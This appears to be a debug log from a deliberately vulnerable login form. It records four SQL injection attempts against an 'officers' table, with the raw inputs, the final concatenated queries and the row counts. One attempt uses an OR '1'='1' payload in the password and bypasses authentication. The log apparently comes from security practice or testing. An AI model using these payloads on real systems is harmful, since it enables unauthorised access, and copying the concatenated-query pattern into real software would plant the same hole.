SQLi DEBUG:
RAW USERNAME: admin -- 
RAW PASSWORD: x
FINAL QUERY: SELECT * FROM officers WHERE username='admin -- ' AND password='x' LIMIT 1
QUERY SUCCESS - ROWS: 0
SQLi DEBUG:
RAW USERNAME: test
RAW PASSWORD: test
FINAL QUERY: SELECT * FROM officers WHERE username='test' AND password='test' OR '1'='1' LIMIT 1
QUERY SUCCESS - ROWS: 1
SQLi DEBUG:
RAW USERNAME: OR 1=1
RAW PASSWORD: IFIGJFG
FINAL QUERY: SELECT * FROM officers WHERE username='OR 1=1' AND password='IFIGJFG' LIMIT 1
QUERY SUCCESS - ROWS: 0
SQLi DEBUG:
RAW USERNAME: OR 1=1 --
RAW PASSWORD: IFIGJFG
FINAL QUERY: SELECT * FROM officers WHERE username='OR 1=1 --' AND password='IFIGJFG' LIMIT 1
QUERY SUCCESS - ROWS: 0
